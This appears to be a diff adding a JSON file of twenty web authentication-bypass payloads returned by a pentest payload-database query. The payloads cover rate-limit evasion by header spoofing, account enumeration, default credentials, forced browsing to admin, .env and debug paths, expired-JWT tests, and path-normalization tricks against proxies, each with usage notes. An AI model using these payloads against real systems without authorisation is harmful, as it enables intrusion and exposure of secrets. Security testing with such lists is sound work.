@@ -1,0 +1,353 @@
+{
+  "query": {
+    "limit": 20,
+    "max_risk": 3,
+    "vuln_type": "auth_bypass"
+  },
+  "count": 20,
+  "results": [
+    {
+      "id": "03baac0065ef3d53",
+      "payload": "X-Forwarded-For: RANDOM_IP",
+      "technique": "rate_limit_burst",
+      "injection_surface": "header",
+      "encoding": "raw",
+      "evidence_type": "status_diff",
+      "risk": 2,
+      "placeholders": [
+        "RANDOM_IP"
+      ],
+      "notes": "Rate limit bypass via X-Forwarded-For rotation. Each request uses a different IP to reset rate counters.",
+      "source": "ensphere",
+      "tags": [
+        "rate_limit",
+        "rotation",
+        "xff"
+      ]
+    },
+    {
+      "id": "093e4fe8a1f71b16",
+      "payload": "username=nonexistent_user_12345\u0026password=wrong",
+      "technique": "account_enumeration",
+      "injection_surface": "form_body",
+      "encoding": "raw",
+      "evidence_type": "response_diff",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "Account enumeration — non-existent username baseline. Compare with known-valid username response.",
+      "source": "ensphere",
+      "tags": [
+        "account_enum",
+        "nonexistent",
+        "username"
+      ]
+    },
+    {
+      "id": "1c0405683ccabea3",
+      "payload": "/swagger",
+      "technique": "forced_browsing",
+      "injection_surface": "path",
+      "encoding": "raw",
+      "evidence_type": "status_diff",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "Direct access to Swagger/OpenAPI docs. Also try /swagger-ui/, /api-docs, /openapi.json.",
+      "source": "ensphere",
+      "tags": [
+        "docs",
+        "forced_browsing",
+        "swagger"
+      ]
+    },
+    {
+      "id": "1f8306e3fd133143",
+      "payload": "/graphql",
+      "technique": "forced_browsing",
+      "injection_surface": "path",
+      "encoding": "raw",
+      "evidence_type": "status_diff",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "Direct access to GraphQL endpoint. Check for introspection with {__schema{types{name}}}.",
+      "source": "ensphere",
+      "tags": [
+        "forced_browsing",
+        "graphql"
+      ]
+    },
+    {
+      "id": "2a8c52e0d2d9d734",
+      "payload": "EXPIRED_JWT",
+      "technique": "jwt_manipulation",
+      "injection_surface": "header",
+      "encoding": "raw",
+      "evidence_type": "status_diff",
+      "risk": 2,
+      "placeholders": [
+        "EXPIRED_JWT"
+      ],
+      "notes": "Send an expired JWT (exp in the past). Tests if the exp claim is validated. Use a previously captured token or forge one with past exp.",
+      "source": "ensphere",
+      "tags": [
+        "bypass",
+        "expiry",
+        "jwt"
+      ]
+    },
+    {
+      "id": "3fecf30298700e8c",
+      "payload": "X-HTTP-Method-Override: PUT",
+      "technique": "auth_control",
+      "injection_surface": "header",
+      "encoding": "raw",
+      "evidence_type": "status_diff",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "HTTP method override header. May bypass method-based access controls (e.g., GET allowed but PUT blocked at proxy).",
+      "source": "ensphere",
+      "tags": [
+        "header",
+        "method_override"
+      ]
+    },
+    {
+      "id": "49eb9fa60bd255af",
+      "payload": "/.env",
+      "technique": "forced_browsing",
+      "injection_surface": "path",
+      "encoding": "raw",
+      "evidence_type": "status_diff",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "Direct access to .env file. May contain API keys, DB credentials, secret keys.",
+      "source": "ensphere",
+      "tags": [
+        "dotenv",
+        "forced_browsing",
+        "secrets"
+      ]
+    },
+    {
+      "id": "4c4ea666fda6462e",
+      "payload": "/debug",
+      "technique": "forced_browsing",
+      "injection_surface": "path",
+      "encoding": "raw",
+      "evidence_type": "status_diff",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "Direct access to debug endpoint.",
+      "source": "ensphere",
+      "tags": [
+        "debug",
+        "forced_browsing"
+      ]
+    },
+    {
+      "id": "678b55c1e1221331",
+      "payload": "admin:password",
+      "technique": "default_credential",
+      "injection_surface": "form_body",
+      "encoding": "raw",
+      "evidence_type": "status_diff",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "Default admin:password.",
+      "source": "ensphere",
+      "tags": [
+        "admin",
+        "default_creds"
+      ]
+    },
+    {
+      "id": "70c78290b1da0b5e",
+      "payload": "/admin/dashboard",
+      "technique": "forced_browsing",
+      "injection_surface": "path",
+      "encoding": "raw",
+      "evidence_type": "status_diff",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "Direct access to admin dashboard.",
+      "source": "ensphere",
+      "tags": [
+        "admin",
+        "dashboard",
+        "forced_browsing"
+      ]
+    },
+    {
+      "id": "7580402481f3841d",
+      "payload": "/%2e/admin",
+      "technique": "auth_control",
+      "injection_surface": "path",
+      "encoding": "raw",
+      "evidence_type": "status_diff",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "URL-encoded dot in path. Proxy sees /%2e/admin (no match for /admin prefix), backend resolves to /./admin = /admin.",
+      "source": "ensphere",
+      "tags": [
+        "bypass",
+        "dot",
+        "path",
+        "url_encoded"
+      ]
+    },
+    {
+      "id": "81f9b37e03b72f78",
+      "payload": "/api/admin/users",
+      "technique": "forced_browsing",
+      "injection_surface": "path",
+      "encoding": "raw",
+      "evidence_type": "status_diff",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "Direct access to admin API endpoint.",
+      "source": "ensphere",
+      "tags": [
+        "admin",
+        "api",
+        "forced_browsing"
+      ]
+    },
+    {
+      "id": "98be8a863f60b00f",
+      "payload": "username=admin\u0026password=wrong",
+      "technique": "account_enumeration",
+      "injection_surface": "form_body",
+      "encoding": "raw",
+      "evidence_type": "response_diff",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "Account enumeration — compare response (timing, status, body) between existing and non-existing usernames.",
+      "source": "ensphere",
+      "tags": [
+        "account_enum",
+        "admin",
+        "username"
+      ]
+    },
+    {
+      "id": "99855e85a740f8f0",
+      "payload": "X-Originating-IP: RANDOM_IP",
+      "technique": "rate_limit_burst",
+      "injection_surface": "header",
+      "encoding": "raw",
+      "evidence_type": "status_diff",
+      "risk": 2,
+      "placeholders": [
+        "RANDOM_IP"
+      ],
+      "notes": "Rate limit bypass via X-Originating-IP header.",
+      "source": "ensphere",
+      "tags": [
+        "rate_limit",
+        "rotation",
+        "x_originating_ip"
+      ]
+    },
+    {
+      "id": "9d1385664f10df67",
+      "payload": "/admin",
+      "technique": "forced_browsing",
+      "injection_surface": "path",
+      "encoding": "raw",
+      "evidence_type": "status_diff",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "Direct access to /admin without authentication.",
+      "source": "ensphere",
+      "tags": [
+        "admin",
+        "forced_browsing",
+        "path"
+      ]
+    },
+    {
+      "id": "a711f1ec6b45ab14",
+      "payload": "/admin/",
+      "technique": "auth_control",
+      "injection_surface": "path",
+      "encoding": "raw",
+      "evidence_type": "status_diff",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "Trailing slash. Tests if /admin and /admin/ are routed to different handlers or if auth middleware only matches one form.",
+      "source": "ensphere",
+      "tags": [
+        "bypass",
+        "path",
+        "trailing_slash"
+      ]
+    },
+    {
+      "id": "ac2a2bbc8b552fe7",
+      "payload": "/admin/../admin",
+      "technique": "auth_control",
+      "injection_surface": "path",
+      "encoding": "raw",
+      "evidence_type": "status_diff",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "Path traversal normalization bypass. Middleware may reject /admin but the server resolves /admin/../admin back to /admin.",
+      "source": "ensphere",
+      "tags": [
+        "bypass",
+        "path",
+        "traversal"
+      ]
+    },
+    {
+      "id": "b144c78c753b0a7f",
+      "payload": "test:test",
+      "technique": "default_credential",
+      "injection_surface": "form_body",
+      "encoding": "raw",
+      "evidence_type": "status_diff",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "Default test:test.",
+      "source": "ensphere",
+      "tags": [
+        "default_creds",
+        "test"
+      ]
+    },
+    {
+      "id": "ba78574c8776b323",
+      "payload": "/admin%2f",
+      "technique": "auth_control",
+      "injection_surface": "path",
+      "encoding": "raw",
+      "evidence_type": "status_diff",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "URL-encoded trailing slash. Proxy sees /admin%2f (no match), backend decodes to /admin/.",
+      "source": "ensphere",
+      "tags": [
+        "bypass",
+        "path",
+        "url_encoded"
+      ]
+    },
+    {
+      "id": "c1d2a92e6f1fe98e",
+      "payload": "/admin;/",
+      "technique": "auth_control",
+      "injection_surface": "path",
+      "encoding": "raw",
+      "evidence_type": "status_diff",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "Semicolon path parameter (Tomcat/Jetty). The servlet container treats /admin;/ as /admin, but a reverse proxy may not match it.",
+      "source": "ensphere",
+      "tags": [
+        "bypass",
+        "path",
+        "semicolon",
+        "tomcat"
+      ]
+    }
+  ]
+}
